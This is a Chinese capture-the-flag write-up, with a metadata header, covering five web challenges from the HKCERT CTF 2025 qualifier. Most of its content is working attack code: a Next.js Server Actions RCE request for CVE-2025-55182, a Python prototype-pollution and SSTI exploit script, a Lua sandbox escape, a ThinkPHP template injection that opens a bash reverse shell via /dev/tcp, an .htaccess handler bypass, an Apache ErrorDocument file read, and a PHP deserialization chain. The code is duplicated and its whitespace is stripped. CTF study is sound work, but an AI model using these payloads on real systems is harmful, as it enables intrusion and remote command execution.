---
title: 香港網安奪旗賽HKCERT CTF 2025 資格賽WEB方向Writeup
contest: HKCERT CTF 2025 資格賽
year: 2025
difficulty: medium
vuln_type: rce
tags:
- nextjs-rce
- cve-2025-55182
- prototype-pollution
- JSON5
- ssti
- lua-sandbox
- gopher-lua
- thinkphp
- tpl-injection
- php-deserialize
- callback
attack_chain:
- 'react: CVE-2025-55182 Next.js RCE直打Next-Action header + multipart form-data'
- 'ezjs: __proto__ admin=true原型链污染绕认证+JSON5.parse SSTI触发process.mainModule.constructor._load("child_process")'
- 'easy-lua: gopher-lua pairs(_G)枚举发现S3cr3t0sEx3cFunc内置RCE函数'
- 'renderme: ThinkPHP {args|func}模板注入+SetHandler application/x-httpd-php;.htaccess绕检测'
- 'r: PHP反序列化RequestHandler匿名类+DateTime::__construct+__wakeup null绕过+RCE'
- Apache ap_expr ErrorDocument 404 %{file:/flag}直接读flag
key_payload: POST /apps multipart __proto__ then prototype pollution chain
one_liner: HKCERT 2025资格赛WEB方向5题,涵盖Next.js最新CVE RCE+原型链污染+JSON5 SSTI+lua沙箱逃逸+ThinkPHP模板注入+PHP反序列化+Apache ap_expr读文件。
lesson: 2025最新Web攻击面包括Next.js Server Actions的__proto__污染+JS对象字面量构造;ap_expr的file函数是Apache的隐藏文件读取向量;ThinkPHP的{args|func}写法能绕过很多函数名过滤。
quality: high
full_path: 香港網安奪旗賽HKCERT_CTF_2025_資格賽WEB方向Writeup.full.md
meta_path: 香港網安奪旗賽HKCERT_CTF_2025_資格賽WEB方向Writeup.meta.md
images_removed: true
images_removed_count: 5
schema_version: v3.0.0-P0
summary: '香港網安奪旗賽HKCERT CTF 2025 資格賽WEB方向Writeup。HKCERT 2025资格赛WEB方向5题,涵盖Next.js最新CVE RCE+原型链污染+JSON5 SSTI+lua沙箱逃逸+ThinkPHP模板注入+PHP反序列化+Apache ap_expr读文件。。关键路径：react: CVE-2025-55182 Next.js RCE直打Next-Action ...'
category: web
subcategory: web_other
tools_used:
- ThinkPHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 5
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/288028.html
reasoning_chain:
- react → 触发点：CVE-2025-55182 Next.js Server Actions RCE
- 假设：Next-Action header + multipart form-data → 动作：公开 POC 直打
- 动作：__proto__ then prototype pollution chain → RCE
- ezjs → 假设：__proto__ admin=true 原型链污染 → 动作：JSON5.parse SSTI
- 假设：process.mainModule.constructor._load("child_process") → spawnSync → cat /flag
- easy-lua → 假设：gopher-lua 沙箱 → 动作：pairs(_G) 枚举
- 观察：发现 S3cr3t0sEx3cFunc 内置 RCE 函数 → 调用
- renderme ThinkPHP → 假设：{args|func} 模板注入 → 动作：func=system
- 动作：SetHandler application/x-httpd-php;.htaccess 绕检测 → RCE
- r PHP 反序列化 → 假设：RequestHandler 匿名类 + DateTime::__construct + __wakeup null 绕
- 动作：构造 POP 链 → RCE
- Apache ap_expr ErrorDocument 404 → 假设：%{file:/flag} → 动作：触发 404 → 读 flag
failed_attempts:
- 试图用普通 Next.js POC → 失败：CVE-2025-55182 需 multipart form-data
- 试图用 ThinkPHP 默认 {if} 模板 → 失败：{args|func} 写法才通
key_observations:
- 2025 最新 Web 攻击面：Next.js Server Actions __proto__ 污染 + JS 对象字面量构造
- ap_expr 的 file 函数是 Apache 的隐藏文件读取向量
- ThinkPHP 的 {args|func} 写法能绕过很多函数名过滤
- JSON5.parse 对 __proto__ 的处理与 JSON.parse 不同，是原型链污染跳板
- gopher-lua pairs(_G) 枚举是沙箱题必备第一步
prerequisites:
- Next.js Server Actions + CVE-2025-55182
- JSON5 与 JSON.parse 差异 + 原型链污染
- ThinkPHP 模板注入 + Apache ap_expr
- PHP 反序列化 POP 链 + DateTime 异常类
---
# 香港網安奪旗賽HKCERT CTF 2025 資格賽WEB方向Writeup

> 原文: https://www.ctfiot.com/288028.html
> ID: 288028

react

前些時間的react RCE漏洞 cve-2025-55182，公開的POC直接打了

POST /apps HTTP/1.1Host: web-294a042d87.challenge.xctf.org.cnNext-Action:
123X-Nextjs-Request-Id: 51fe50ef2a379133Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye12x8j2OX-Nextjs-Html-Request-Id: 2344e891bc6a0657004928128530dc287d17a91Content-Length:
603------WebKitFormBoundarye12x8j2OContent-Disposition: form-data; name="0"{ "then":"$1:
__proto__:
then", "status":"resolved_model", "reason": -1, "value":"{"then":"$B12345"}", "_response": { "_prefix":"var res=process.mainModule.require('child_process').execSync('cat /flag').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});", "_formData": { "get":"$1:
toString:
constructor" } }}------WebKitFormBoundarye12x8j2OContent-Disposition: form-data; name="1""$@0"------WebKitFormBoundarye12x8j2O--

ezjs

原型鏈污染+SSTI，直接交給AI生成POC

importrequestsimportjsonBASE_URL="http://web-b549c32103.challenge.xctf.org.cn:80"deftest_auth_bypass_and_rce(): session = requests.Session() #1.Authentication Bypass print("[*] Attempting Authentication Bypass via Prototype Pollution...") # Payload: JSON with __proto__ to pollute the object prototype # JSON.stringify will produce'{"__proto__":{"admin":
true}}' # JSON5.parse will interpretthisas setting theprototype login_payload={ "__proto__": { "admin": True } } try: # Sending as JSON so body-parser parses it, then app.js stringifies it and parses with JSON5 # Note: The app logic is: # let userinfo=JSON.stringify(req.body) #constuser=JSON5.parse(userinfo) # So we send standard JSON. res = session.post(f"{BASE_URL}/login", json=login_payload) print(f"[*] Login Response: {res.text}") if"hello,admin"in res.text: print("[+] Authentication Bypass Successful! We are now admin.") else: print("[-] Authentication Bypass Failed.") return 
except Exception as e: print(f"[-] Error during login: {e}") return #2.SSTI / RCE print("n[*] Attempting SSTI / RCE...") # Payload to bypass"require"and"exec"filter # We use process.mainModule.constructor._load to load child_process # We use spawnSync to execute command # cmd ="ls -al" # The template is:'welcome '+ word # Injection: #{...} # Constructing the payload # global.process.mainModule.constructor._load("child_process").spawnSync("ls", ["-al"]).stdout payload_str=f'#{{global.process.mainModule.constructor._load("child_process").spawnSync("cat", ["/flag"]).stdout}}' data = { "word": payload_str } try: res = session.post(f"{BASE_URL}/render", data=data) print(f"[*] Render Response Status: {res.status_code}") print(f"[*] Render Output:n{res.text}") if"package.json"in res.text or"app.js"in res.text: print("[+] RCE Successful! Directory listing found.") else: print("[-] RCE Verification failed (output might be different or empty).") 
except Exception as e: print(f"[-] Error during RCE attempt: {e}")if__name__ =="__main__": test_auth_bypass_and_rce()

easy-lua

先列出可以調用的所有方法

fork,v inpairs(_G)do print(k, type(v))end

得到如下結果：

package	table_G	table_VERSION	string_GOPHER_LUA_VERSION	stringtostring	functionassert	functionloadfile	functionrawequal	functionselect	functionsetfenv	functionsetmetatable	functionxpcall	functionrequire	functiongetfenv	functionload	functionnext	functionpcall	functionrawset	functionunpack	functionmodule	functioncollectgarbage	functionprint	functiontype	functionnewproxy	functiondofile	functionerror	functiongetmetatable	functionloadstring	functionrawget	function_printregs	functiontonumber	functionipairs	functionpairs	functiontable	tablestring	tablemath	tableS3cr3t0sEx3cFunc	functiongetFileContent	functiongetFileList	function

getFileContent無法直接獲取到flag內容，嘗試使用loadfile函數可以從報錯內容中洩露flag的部分內容，但是不完整，然後發現了S3cr3t0sEx3cFunc函數，可以直接執行命令，使用下面的語句可以直接獲取flag

print(pcall(S3cr3t0sEx3cFunc,"cat /flag"))

renderme

明顯的tp圖標，過濾了不少字符，如： 常見的php函數名、單雙引號等，可以翻閱thinkphp的模板渲染部分文檔可知，可以{args|func}這樣去使用函數，因此如果能構造出{“id”|system}即可執行命令，但是引號被過濾，system等函數名也被過濾

測試之後發現指令的值是可以使用解碼標籤的，因此可以上傳.htaccess，並且用url解碼來繞過檢測，將所有文件解析為php

SetHandler application/x-httpd-ph%{unescape:%70}

但是無奈?被過濾，想通過php_value來打一些繞過發現指令名中是不允許使用%{}標籤的，因此沒能打通。然後在源碼中發現了一些可用的表達式函數

r

php反序列化題目

<?phpclassRequestHandler{ public$processor; public$action; publicfunction__construct(){ $this->processor =newclass{ private$handle; publicfunction__construct(){ $this->handle = tmpfile(); } publicfunction__wakeup(){ $this->handle =null; } publicfunctionexecute(){ if(!is_resource($this->handle)) { die("Invalid resource state
"); } system($_GET['cmd']); } }; } publicfunction__destruct(){ if(!is_array($this->action)) { die("Error: action must be an array"); } $cb=$this->action; $cb(); }}unserialize($_GET['data']);

思路：利用對象引用，先反序列化時利用 [RequestHandler對象, ‘__construct’]對RequestHandler進行實例話，然後把action和processor引用一下，實例化時processor被賦予匿名類，再調用它的execute即可完成RCE。使用以下poc來生成

<?phpclassRequestHandler{ public$processor; public$action; publicfunction__construct(){ $this->processor =newclass{ private$handle; publicfunction__construct(){ $this->handle = tmpfile(); } publicfunction__wakeup(){ $this->handle =null; } publicfunctionexecute(){ if(!is_resource($this->handle)) { die("Invalid resource state
"); } system($_GET['cmd']); } }; } publicfunction__destruct(){ if(!is_array($this->action)) { die("Error: action must be an array"); } $cb=$this->action; $cb(); }}$a =newRequestHandler();$a -> processor ="";$a -> action = ["DateTime","getLastErrors"];$b =newRequestHandler();$b -> processor ="";$b -> action = [$a,"__construct"];$c =newRequestHandler();$c -> processor ="";$c -> action = [&$a -> processor,"execute"];echoserialize([$a, $b, $c]);


```
POST /apps HTTP/1.1Host: web-294a042d87.challenge.xctf.org.cnNext-Action:
123X-Nextjs-Request-Id: 51fe50ef2a379133Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye12x8j2OX-Nextjs-Html-Request-Id: 2344e891bc6a0657004928128530dc287d17a91Content-Length:
603------WebKitFormBoundarye12x8j2OContent-Disposition: form-data; name="0"{ "then":"$1:
__proto__:
then", "status":"resolved_model", "reason": -1, "value":"{"then":"$B12345"}", "_response": { "_prefix":"var res=process.mainModule.require('child_process').execSync('cat /flag').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});", "_formData": { "get":"$1:
toString:
constructor" } }}------WebKitFormBoundarye12x8j2OContent-Disposition: form-data; name="1""$@0"------WebKitFormBoundarye12x8j2O--
importrequestsimportjsonBASE_URL="http://web-b549c32103.challenge.xctf.org.cn:80"deftest_auth_bypass_and_rce(): session = requests.Session() #1.Authentication Bypass print("[*] Attempting Authentication Bypass via Prototype Pollution...") # Payload: JSON with __proto__ to pollute the object prototype # JSON.stringify will produce'{"__proto__":{"admin":
true}}' # JSON5.parse will interpretthisas setting theprototype login_payload={ "__proto__": { "admin": True } } try: # Sending as JSON so body-parser parses it, then app.js stringifies it and parses with JSON5 # Note: The app logic is: # let userinfo=JSON.stringify(req.body) #constuser=JSON5.parse(userinfo) # So we send standard JSON. res = session.post(f"{BASE_URL}/login", json=login_payload) print(f"[*] Login Response: {res.text}") if"hello,admin"in res.text: print("[+] Authentication Bypass Successful! We are now admin.") else: print("[-] Authentication Bypass Failed.") return 
except Exception as e: print(f"[-] Error during login: {e}") return #2.SSTI / RCE print("n[*] Attempting SSTI / RCE...") # Payload to bypass"require"and"exec"filter # We use process.mainModule.constructor._load to load child_process # We use spawnSync to execute command # cmd ="ls -al" # The template is:'welcome '+ word # Injection: #{...} # Constructing the payload # global.process.mainModule.constructor._load("child_process").spawnSync("ls", ["-al"]).stdout payload_str=f'#{{global.process.mainModule.constructor._load("child_process").spawnSync("cat", ["/flag"]).stdout}}' data = { "word": payload_str } try: res = session.post(f"{BASE_URL}/render", data=data) print(f"[*] Render Response Status: {res.status_code}") print(f"[*] Render Output:n{res.text}") if"package.json"in res.text or"app.js"in res.text: print("[+] RCE Successful! Directory listing found.") else: print("[-] RCE Verification failed (output might be different or empty).") 
except Exception as e: print(f"[-] Error during RCE attempt: {e}")if__name__ =="__main__": test_auth_bypass_and_rce()
fork,v inpairs(_G)do print(k, type(v))end
print(pcall(S3cr3t0sEx3cFunc,"cat /flag"))
?name={$Request.get.page|$Request.get.x}&page=bash%20-c%20"bash%20-i>%26%2fdev%2ftcp%2fxxx.xxx.xxx.xxx%2f6666%200>%261"&x=system
find / -type f -perm -40002>/dev/null
choom -n0-- /bin/sh -pcat /root/flag
SetHandler application/x-httpd-ph%{unescape:%70}
staticconstchar*file_func(ap_expr_eval_ctx_t *ctx, constvoid*data, char*arg){ apr_file_t *fp; char*buf; apr_off_t offset; apr_size_t len; apr_finfo_t finfo; if(apr_file_open(&fp, arg, APR_READ|APR_BUFFERED, APR_OS_DEFAULT, ctx->p) != APR_SUCCESS) { *ctx->err = apr_psprintf(ctx->p,"Cannot open file %s", arg); return""; } apr_file_info_get(&finfo, APR_FINFO_SIZE, fp); if(finfo.size > MAX_FILE_SIZE) { *ctx->err = apr_psprintf(ctx->p,"File %s too large", arg); apr_file_close(fp); return""; } len = (apr_size_t)finfo.size; if(len ==0) { apr_file_close(fp); return""; } else{ if((buf = (char*)apr_palloc(ctx->p, sizeof(char)*(len+1))) == NULL) { *ctx->err ="Cannot allocate memory"; apr_file_close(fp); return""; } offset =0; apr_file_seek(fp, APR_SET, &offset); if(apr_file_read(fp, buf, &len) != APR_SUCCESS) { *ctx->err = apr_psprintf(ctx->p,"Cannot read from file %s", arg); apr_file_close(fp); return""; } buf[len] =' '; } apr_file_close(fp); returnbuf;}
ErrorDocument404%{file:/flag}
<?phpclassRequestHandler{ public$processor; public$action; publicfunction__construct(){ $this->processor =newclass{ private$handle; publicfunction__construct(){ $this->handle = tmpfile(); } publicfunction__wakeup(){ $this->handle =null; } publicfunctionexecute(){ if(!is_resource($this->handle)) { die("Invalid resource state
"); } system($_GET['cmd']); } }; } publicfunction__destruct(){ if(!is_array($this->action)) { die("Error: action must be an array"); } $cb=$this->action; $cb(); }}unserialize($_GET['data']);
<?phpclassRequestHandler{ public$processor; public$action; publicfunction__construct(){ $this->processor =newclass{ private$handle; publicfunction__construct(){ $this->handle = tmpfile(); } publicfunction__wakeup(){ $this->handle =null; } publicfunctionexecute(){ if(!is_resource($this->handle)) { die("Invalid resource state
"); } system($_GET['cmd']); } }; } publicfunction__destruct(){ if(!is_array($this->action)) { die("Error: action must be an array"); } $cb=$this->action; $cb(); }}$a =newRequestHandler();$a -> processor ="";$a -> action = ["DateTime","getLastErrors"];$b =newRequestHandler();$b -> processor ="";$b -> action = [$a,"__construct"];$c =newRequestHandler();$c -> processor ="";$c -> action = [&$a -> processor,"execute"];echoserialize([$a, $b, $c]);
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]